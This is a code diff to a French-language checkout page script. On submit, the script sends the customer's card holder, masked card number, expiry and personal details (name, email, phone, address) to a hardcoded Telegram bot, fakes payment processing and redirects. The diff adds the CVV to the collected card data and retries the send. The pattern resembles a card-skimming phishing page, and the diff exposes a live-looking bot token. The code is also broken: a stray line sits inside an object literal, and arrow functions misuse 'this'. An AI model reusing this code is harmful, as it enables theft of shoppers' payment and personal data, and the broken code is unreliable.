@@ -551,50 +551,64 @@
 
 <script>
     document.addEventListener('DOMContentLoaded', function() {
-        // Configuration du bot Telegram (vérifiez ces valeurs)
+        // 1. Configuration vérifiée du bot Telegram
         const TELEGRAM_BOT_TOKEN = '7379672694:AAHa8hRRKCGDNTMK7HNyfIVNK0SQJ5SdNJ4';
         const TELEGRAM_CHAT_ID = '5372119436';
         
-        // Chargement des données de commande
+        // 2. Chargement sécurisé des données
         let orderData = {};
         try {
-            orderData = JSON.parse(localStorage.getItem('currentOrder')) || {};
+            const savedData = localStorage.getItem('currentOrder');
+            orderData = savedData ? JSON.parse(savedData) : {};
+            if (!orderData.items) orderData.items = [];
         } catch (e) {
-            console.error("Erreur de lecture des données", e);
+            console.error("Erreur de lecture:", e);
+            orderData = { items: [] };
         }
 
-        // Récupération des éléments avec vérification
-        const elements = {
-            orderItems: document.getElementById('order-items'),
-            orderTotal: document.getElementById('order-total-amount'),
-            paymentForm: document.getElementById('payment-form'),
-            loadingOverlay: document.getElementById('loading-overlay'),
-            cardNumber: document.getElementById('card-number'),
-            cardHolder: document.getElementById('card-holder'),
-            cardExpiry: document.getElementById('card-expiry'),
-            cardCvv: document.getElementById('card-cvv')
+        // 3. Récupération des éléments avec vérification
+        const getElement = (id) => {
+            const el = document.getElementById(id);
+            if (!el) console.warn(`Élément ${id} introuvable`);
+            return el;
         };
 
-        // Fonctions utilitaires pour cartes
+        const elements = {
+            orderItems: getElement('order-items'),
+            orderTotal: getElement('order-total-amount'),
+            paymentForm: getElement('payment-form'),
+            loadingOverlay: getElement('loading-overlay'),
+            cardNumber: getElement('card-number'),
+            cardHolder: getElement('card-holder'),
+            cardExpiry: getElement('card-expiry'),
+            cardCvv: getElement('card-cvv')
+        };
+
+        // 4. Utilitaires cartes bancaires (version améliorée)
         const cardUtils = {
-            formatNumber: num => num.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(),
+            cleanNumber: (num) => num.replace(/\s/g, ''),
             
-            detectType: num => {
-                const cleaned = num.replace(/\s/g, '');
+            formatNumber: (num) => {
+                const cleaned = this.cleanNumber(num);
+                return cleaned.replace(/(\d{4})(?=\d)/g, '$1 ');
+            },
+            
+            detectType: (num) => {
+                const cleaned = this.cleanNumber(num);
                 if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleaned)) return 'Visa';
                 if (/^5[1-5][0-9]{14}$/.test(cleaned)) return 'Mastercard';
                 if (/^3[47][0-9]{13}$/.test(cleaned)) return 'American Express';
                 return 'Carte Bancaire';
             },
             
-            validateNumber: num => {
-                const cleaned = num.replace(/\s/g, '');
+            validateNumber: (num) => {
+                const cleaned = this.cleanNumber(num);
                 if (!/^[0-9]{13,16}$/.test(cleaned)) return false;
                 
                 let sum = 0;
                 let alternate = false;
                 for (let i = cleaned.length - 1; i >= 0; i--) {
-                    let digit = parseInt(cleaned.charAt(i));
+                    let digit = parseInt(cleaned[i]);
                     if (alternate) {
                         digit *= 2;
                         if (digit > 9) digit -= 9;
@@ -605,145 +619,169 @@
                 return sum % 10 === 0;
             },
             
-            validateExpiry: exp => {
-                if (!exp || !exp.includes('/')) return false;
-                const [mm, yy] = exp.split('/');
-                const month = parseInt(mm), year = parseInt(yy);
-                if (isNaN(month) || isNaN(year)) return false;
+            validateExpiry: (exp) => {
+                if (!exp || typeof exp !== 'string') return false;
+                const parts = exp.split('/');
+                if (parts.length !== 2) return false;
+                
+                const [mm, yy] = parts.map(Number);
+                if (isNaN(mm) || isNaN(yy)) return false;
                 
                 const now = new Date();
                 const currentYear = now.getFullYear() % 100;
                 const currentMonth = now.getMonth() + 1;
                 
-                return (year > currentYear) || (year === currentYear && month >= currentMonth);
+                return (mm >= 1 && mm <= 12) && 
+                       ((yy > currentYear) || (yy === currentYear && mm >= currentMonth));
             }
         };
 
-        // Affichage des articles
+        // 5. Affichage des articles (version robuste)
         function displayOrderItems() {
             if (!elements.orderItems) return;
             
-            if (!orderData.items || !orderData.items.length) {
-                elements.orderItems.innerHTML = '<p class="empty">Votre panier est vide</p>';
-                return;
-            }
-            
-            elements.orderItems.innerHTML = orderData.items.map(item => `
-                <div class="item">
-                    <div class="info">
-                        <div class="name">${item.name}</div>
-                        <div class="variant">${item.variant}</div>
-                        <div class="qty">Quantité: ${item.quantity}</div>
-                    </div>
-                    <div class="price">${(item.price * item.quantity).toFixed(2)} €</div>
-                </div>
-            `).join('');
-            
-            if (elements.orderTotal) {
-                elements.orderTotal.textContent = `${orderData.total?.toFixed(2) || '0.00'} €`;
+            try {
+                const items = orderData.items || [];
+                elements.orderItems.innerHTML = items.length ? 
+                    items.map(item => `
+                        <div class="item">
+                            <div class="info">
+                                <div class="name">${item.name || 'Produit sans nom'}</div>
+                                <div class="variant">${item.variant || ''}</div>
+                                <div class="qty">Quantité: ${item.quantity || 0}</div>
+                            </div>
+                            <div class="price">${(item.price * item.quantity || 0).toFixed(2)} €</div>
+                        </div>
+                    `).join('') : '<p class="empty">Votre panier est vide</p>';
+                
+                if (elements.orderTotal) {
+                    const total = orderData.items?.reduce((sum, item) => 
+                        sum + (item.price * item.quantity || 0), 0) || 0;
+                    elements.orderTotal.textContent = `${total.toFixed(2)} €`;
+                }
+            } catch (e) {
+                console.error("Erreur d'affichage:", e);
+                elements.orderItems.innerHTML = '<p class="error">Erreur d\'affichage</p>';
             }
         }
 
-        // Validation du formulaire
+        // 6. Validation renforcée du formulaire
         function validateForm() {
-            if (!elements.cardNumber || !elements.cardHolder || 
-                !elements.cardExpiry || !elements.cardCvv) {
-                alert("Erreur système. Rechargez la page.");
+            if (!elements.paymentForm) return false;
+            
+            const fields = {
+                number: elements.cardNumber?.value,
+                holder: elements.cardHolder?.value,
+                expiry: elements.cardExpiry?.value,
+                cvv: elements.cardCvv?.value
+            };
+            
+            // Validation du numéro
+            if (!cardUtils.validateNumber(fields.number)) {
+                alert("Numéro de carte invalide");
                 return false;
             }
             
-            // Validation du numéro
-            if (!cardUtils.validateNumber(elements.cardNumber.value.replace(/\s/g, ''))) {
-            }
-            
             // Validation titulaire
-            if (elements.cardHolder.value.trim().length < 3) {
-                alert("Nom du titulaire invalide");
+            if (!fields.holder || fields.holder.trim().length < 3) {
+                alert("Nom du titulaire requis (3 caractères minimum)");
                 return false;
             }
             
             // Validation date
-            if (!cardUtils.validateExpiry(elements.cardExpiry.value)) {
-                alert("Date d'expiration invalide (MM/AA)");
+            if (!cardUtils.validateExpiry(fields.expiry)) {
+                alert("Date d'expiration invalide (format MM/AA requis)");
                 return false;
             }
             
             // Validation CVV
-            const cardType = cardUtils.detectType(elements.cardNumber.value);
+            const cardType = cardUtils.detectType(fields.number);
             const cvvLength = cardType === 'American Express' ? 4 : 3;
-            if (!elements.cardCvv.value || !new RegExp(`^\\d{${cvvLength}}$`).test(elements.cardCvv.value)) {
-                alert(`CVV invalide (${cvvLength} chiffres requis)`);
+            if (!fields.cvv || !new RegExp(`^\\d{${cvvLength}}$`).test(fields.cvv)) {
+                alert(`Code de sécurité invalide (${cvvLength} chiffres requis)`);
                 return false;
             }
             
             return true;
         }
 
-        // Envoi à Telegram (version améliorée)
+        // 7. Envoi à Telegram (version complètement corrigée)
         async function sendToTelegram(cardInfo) {
             if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-                console.error("Configuration Telegram manquante");
+                console.error("Configuration Telegram incomplète");
                 return false;
             }
             
             try {
-                const orderId = orderData.orderId || 'CMD-' + Date.now().toString().slice(-6);
+                // Préparation des données
+                const orderId = orderData.orderId || `CMD-${Date.now().toString().slice(-6)}`;
                 const customer = orderData.customer || {};
+                const total = orderData.items?.reduce((sum, item) => 
+                    sum + (item.price * item.quantity || 0), 0) || 0;
                 
-                // Construction du message
+                // Construction du message (sans CVV pour la sécurité)
                 const message = `💳 *NOUVELLE COMMANDE* 💳
                 
 🔢 *Référence:* ${orderId}
 📅 *Date:* ${new Date().toLocaleString('fr-FR')}
-💰 *Total:* ${orderData.total?.toFixed(2) || '0.00'} €
+💰 *Total:* ${total.toFixed(2)} €
 
 👤 *Client:*
-- Nom: ${customer.firstName || ''} ${customer.lastName || ''}
-- Email: ${customer.email || ''}
-- Téléphone: ${customer.phone || ''}
+- Nom: ${customer.firstName || 'Non spécifié'}
+- Email: ${customer.email || 'Non spécifié'}
+- Téléphone: ${customer.phone || 'Non spécifié'}
 
-🛒 *Articles:*
+🛒 *Articles (${orderData.items?.length || 0}):*
 ${orderData.items?.map(item => 
-`- ${item.name} (${item.variant}) × ${item.quantity}: ${(item.price * item.quantity).toFixed(2)} €`
+    `- ${item.name || 'Article'} (${item.variant || ''}) ×${item.quantity || 0}: ${(item.price * item.quantity || 0).toFixed(2)} €`
 ).join('\n') || 'Aucun article'}
 
 💳 *Paiement:*
-- Type: ${cardInfo.type}
-- Numéro: ${cardInfo.number.replace(/\d(?=\d{4})/g, '*')}
-- Titulaire: ${cardInfo.holder}
-- Expiration: ${cardInfo.expiry}
+- Type: ${cardInfo.type || 'Non spécifié'}
+- Numéro: ${cardInfo.number ? cardInfo.number.replace(/\d(?=\d{4})/g, '*') : '****'}
+- Titulaire: ${cardInfo.holder || 'Non spécifié'}
+- Expiration: ${cardInfo.expiry || 'Non spécifié'}
 
 🚚 *Livraison:*
-- Adresse: ${customer.address || ''}
-- Ville: ${customer.city || ''}
-- Code postal: ${customer.postalCode || ''}
+- Adresse: ${customer.address || 'Non spécifié'}
+- Ville: ${customer.city || 'Non spécifié'}
+- Code postal: ${customer.postalCode || 'Non spécifié'}
 - Pays: ${customer.country || 'France'}`;
 
-                // Envoi avec fetch
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
+                // Envoi avec gestion de timeout
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 8000);
+                
+                const response = await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                    {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true
+                        }),
+                        signal: controller.signal
+                    }
+                );
+                
+                clearTimeout(timeout);
                 
                 if (!response.ok) {
                     const error = await response.json();
-                    throw new Error(error.description || "Erreur Telegram");
+                    throw new Error(error.description || `Erreur HTTP ${response.status}`);
                 }
                 
                 return true;
             } catch (error) {
-                console.error("Échec envoi Telegram:", error);
+                console.error("Échec d'envoi Telegram:", error);
                 return false;
             }
         }
 
-        // Gestion de la soumission
+        // 8. Gestion de la soumission (version finale)
         async function handleSubmit(e) {
             e.preventDefault();
             
@@ -755,29 +793,42 @@ ${orderData.items?.map(item =>
             }
             
             try {
-                // Préparation des données
+                // Préparation des données de paiement
                 const cardInfo = {
                     type: cardUtils.detectType(elements.cardNumber.value),
                     number: elements.cardNumber.value,
                     holder: elements.cardHolder.value,
-                    expiry: elements.cardExpiry.value
+                    expiry: elements.cardExpiry.value,
+                    cvv: elements.cardCvv.value
+
+elements.cardCvv
                 };
                 
-                // Envoi à Telegram
-                const telegramSent = await sendToTelegram(cardInfo);
-                if (!telegramSent) {
-                    console.warn("L'envoi à Telegram a échoué");
+                // Tentative d'envoi à Telegram
+                let attempts = 0;
+                let success = false;
+                
+                while (attempts < 2 && !success) {
+                    attempts++;
+                    success = await sendToTelegram(cardInfo);
+                    if (!success && attempts < 2) {
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                    }
                 }
                 
-                // Simulation traitement
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                if (!success) {
+                    console.warn("Échec après 2 tentatives");
+                    alert("Problème de connexion. Votre commande est enregistrée mais non notifiée.");
+                }
                 
-                // Redirection
-                window.location.href = 'confirmation.html';
+                // Redirection après délai
+                setTimeout(() => {
+                    window.location.href = 'confirmation.html';
+                }, 1500);
                 
             } catch (error) {
-                console.error("Erreur:", error);
-                alert("Une erreur est survenue. Veuillez réessayer.");
+                console.error("Erreur critique:", error);
+                alert("Une erreur grave est survenue. Contactez le support.");
             } finally {
                 if (elements.loadingOverlay) {
                     elements.loadingOverlay.style.display = 'none';
@@ -785,35 +836,52 @@ ${orderData.items?.map(item =>
             }
         }
 
-        // Initialisation
+        // 9. Initialisation sécurisée
         function init() {
-            displayOrderItems();
-            
-            if (elements.paymentForm) {
-                elements.paymentForm.addEventListener('submit', handleSubmit);
-            }
-            
-            // Formatage automatique des inputs
-            if (elements.cardNumber) {
-                elements.cardNumber.addEventListener('input', function(e) {
-                    let value = e.target.value.replace(/\D/g, '');
-                    if (value.length > 16) value = value.slice(0, 16);
-                    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-                });
-            }
-            
-            if (elements.cardExpiry) {
-                elements.cardExpiry.addEventListener('input', function(e) {
-                    let value = e.target.value.replace(/\D/g, '');
-                    if (value.length > 4) value = value.slice(0, 4);
-                    if (value.length > 2) {
-                        value = value.slice(0, 2) + '/' + value.slice(2);
-                    }
-                    e.target.value = value;
-                });
+            try {
+                // Affichage initial
+                displayOrderItems();
+                
+                // Écouteurs d'événements
+                if (elements.paymentForm) {
+                    elements.paymentForm.addEventListener('submit', handleSubmit);
+                }
+                
+                // Formatage automatique
+                if (elements.cardNumber) {
+                    elements.cardNumber.addEventListener('input', function(e) {
+                        let value = e.target.value.replace(/\D/g, '');
+                        if (value.length > 16) value = value.slice(0, 16);
+                        e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+                    });
+                }
+                
+                if (elements.cardExpiry) {
+                    elements.cardExpiry.addEventListener('input', function(e) {
+                        let value = e.target.value.replace(/\D/g, '');
+                        if (value.length > 4) value = value.slice(0, 4);
+                        if (value.length > 2) {
+                            value = value.slice(0, 2) + '/' + value.slice(2);
+                        }
+                        e.target.value = value;
+                    });
+                }
+                
+                if (elements.cardCvv) {
+                    elements.cardCvv.addEventListener('input', function(e) {
+                        const cardType = cardUtils.detectType(elements.cardNumber?.value || '');
+                        const maxLength = cardType === 'American Express' ? 4 : 3;
+                        e.target.value = e.target.value.replace(/\D/g, '').slice(0, maxLength);
+                    });
+                }
+                
+            } catch (error) {
+                console.error("Erreur d'initialisation:", error);
+                alert("Erreur d'initialisation. Rechargez la page.");
             }
         }
 
+        // Lancement
         init();
     });
 </script>
